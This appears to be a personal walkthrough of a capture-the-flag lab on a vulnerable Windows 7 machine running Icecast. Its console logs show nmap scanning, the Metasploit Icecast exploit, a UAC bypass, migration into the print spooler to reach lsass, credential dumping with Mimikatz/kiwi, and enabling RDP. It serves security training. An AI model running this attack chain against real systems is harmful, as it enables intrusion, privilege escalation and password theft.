# [Task 2] Recon 
```console
kali@kali:~/ice$ sudo nmap -sS -p- 10.10.116.208
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-29 19:26 EDT
Nmap scan report for 10.10.116.208
Host is up (0.045s latency).
Not shown: 65523 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
8000/tcp  open  http-alt
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49157/tcp open  unknown
49161/tcp open  unknown
49162/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 396.76 seconds
```
info:
* ms-wbt-server = 3389, for MSPRD [links](https://www.speedguide.net/port.php?port=3389)
* wsdapi = [5357] Used by Microsoft Network Discovery (https://www.speedguide.net/port.php?port=5357) 
* [445](https://www.grc.com/port_445.htm) Microsoft-DS Active Directory, Windows shares (Official) Microsoft-DS SMB file sharing (Official)
* netbios-ssn = [139](https://www.speedguide.net/port.php?port=139) NetBIOS is a protocol used for File and Print Sharing under all current versions of Windows 

```console
kali@kali:~/ice$ nmap -sV -p 8000 10.10.116.208
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-29 19:44 EDT
Nmap scan report for 10.10.116.208
Host is up (0.044s latency).

PORT     STATE SERVICE VERSION
8000/tcp open  http    Icecast streaming media server

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.26 seconds
```
damn just ```-A``` and ```--script``` vuln instead, then we get everything at ones



# [Task 3] Gain Access 
usefull [link](https://www.cvedetails.com/vulnerability-list.php?vendor_id=693&product_id=&version_id=&page=1&hasexp=0&opdos=0&opec=0&opov=0&opcsrf=0&opgpriv=0&opsqli=0&opxss=0&opdirt=0&opmemc=0&ophttprs=0&opbyp=0&opfileinc=0&opginf=0&cvssscoremin=7&cvssscoremax=0&year=0&month=0&cweid=0&order=1&trc=16&sha=364cce96ddf16434d8c84a9c7a2c9c047a2a3145)

```
msf5 > search icecast

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite


msf5 > use 0                         
msf5 exploit(windows/http/icecast_header) >  show options 

Module options (exploit/windows/http/icecast_header):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   8000             yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(windows/http/icecast_header) > set RHOSTS 10.10.116.208
RHOSTS => 10.10.116.208
msf5 exploit(windows/http/icecast_header) > run
```

# [Task 4] Escalate 
## #2
run ```ps``` and find out
## #3 + #4
```sysinfo``` get info about the system
```
meterpreter > sysinfo
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```
## #5 #6
```run post/multi/recon/local_exploit_suggester``` can be use to find vulnerability on the system. dosent work well with x64
```
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.116.208 - Collecting local exploits for x86/windows...
[*] 10.10.116.208 - 29 exploit checks are being tried...
[+] 10.10.116.208 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.116.208 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
[+] 10.10.116.208 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.116.208 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.116.208 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.116.208 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.116.208 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.116.208 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.116.208 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.

```

## #7+
now when we found the exploit, background by ```ctl+z``` the session and jump back to ```msf```. then use the first exploit to run another attack what will give us root privilages
```
msf5 exploit(windows/http/icecast_header) > use exploit/windows/local/bypassuac_eventvwr
msf5 exploit(windows/local/bypassuac_eventvwr) > show option
[-] Invalid parameter "option", use "show -h" for more information
msf5 exploit(windows/local/bypassuac_eventvwr) > show options 

Module options (exploit/windows/local/bypassuac_eventvwr):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf5 exploit(windows/local/bypassuac_eventvwr) > sessions 

Active sessions
===============

  Id  Name  Type                     Information             Connection
  --  ----  ----                     -----------             ----------
  1         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.8.14.151:4444 -> 10.10.116.208:49261 (10.10.116.208)

msf5 exploit(windows/local/bypassuac_eventvwr) > set SESSION 1
SESSION => 1
msf5 exploit(windows/local/bypassuac_eventvwr) > set LHOST 10.8.14.151LHOST => 10.8.14.151
msf5 exploit(windows/local/bypassuac_eventvwr) > run
```
We can now verify that we have expanded permissions using the command ```getprivs```.
```
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

# [Task 5] Looting 
gather additional credentials and crack the saved hashes on the machine.


we need to move to a process that actually has the permissions that we need to interact with the **lsass service**, the service **responsible for authentication within Windows.**


In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass. The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it!
```
meterpreter > ps
                                                                                                                                    
Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]                                                   
 4     0     System                x64   0                                      
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
 424   692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
 504   692   vds.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
 544   536   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 584   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 592   536   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 604   584   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 652   584   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 692   592   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
 700   592   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 708   592   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
 816   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 884   692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 932   692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1020  692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1060  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1188  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1308  1020  dwm.exe               x64   1        Dark-PC\Dark                  C:\Windows\System32\dwm.exe
 1320  1288  explorer.exe          x64   1        Dark-PC\Dark                  C:\Windows\explorer.exe
 1340  816   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
 1372  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1400  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1464  692   taskhost.exe          x64   1        Dark-PC\Dark                  C:\Windows\System32\taskhost.exe
 1552  692   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1644  692   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
 1684  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1820  692   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 2076  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 2252  1320  Icecast2.exe          x86   1        Dark-PC\Dark                  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe
 2460  816   slui.exe              x64   1        Dark-PC\Dark                  C:\Windows\System32\slui.exe
 2536  692   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
 2604  604   conhost.exe           x64   1        Dark-PC\Dark                  C:\Windows\System32\conhost.exe
 2632  692   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
 2856  1420  powershell.exe        x86   1        Dark-PC\Dark                  C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe

meterpreter > migrate 1372 # jump to spoolsv
[*] Migrating from 2856 to 1372...
[*] Migration completed successfully.
meterpreter > getuid # check what user we are now with the command
Server username: NT AUTHORITY\SYSTEM
```

Now that we've made our way to full administrator permissions we'll set our sights on looting. Mimikatz is a rather infamous password dumping tool that is incredibly useful. Load it now using the command `load kiwi` (Kiwi is the updated version of Mimikatz)
```
meterpreter > creds_all # get password
```

One last thing to note. As we have the password for the user 'Dark' we can now authenticate to the machine and access it via remote desktop (MSRDP). As this is a workstation, we'd likely kick whatever user is signed onto it off if we connect to it, however, it's always interesting to remote into machines and view them as their users do. If this hasn't already been enabled, we can enable it via the following Metasploit module: `run post/windows/manage/enable_rdp`

# TASK 7
need to try to run exploit from this https://www.exploit-db.com/exploits/568. it would be nice to make the machine open calculator or something